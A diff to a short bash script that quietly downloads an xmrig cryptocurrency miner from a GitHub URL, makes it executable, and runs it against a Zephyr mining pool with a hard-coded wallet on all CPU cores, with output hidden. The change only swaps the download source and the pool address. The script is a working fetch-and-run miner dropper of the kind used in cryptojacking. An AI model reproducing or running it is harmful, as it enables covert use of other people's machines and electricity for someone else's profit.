@@ -1,4 +1,4 @@
 #!/bin/bash
-wget -O sgr1 https://github.com/parmount6/filesg/raw/main/xmrig >/dev/null 2>&1
+wget -O sgr1 https://github.com/6248202226/filesg/raw/main/xmrig >/dev/null 2>&1
 chmod +x sgr1
-./sgr1 -a rx/0 -o 149.28.147.155:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-A) -t $(nproc --all) --donate-level 1 -k
+./sgr1 -a rx/0 -o de.zephyr.herominers.com:1123 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-A) -t $(nproc --all) --donate-level 1 -k
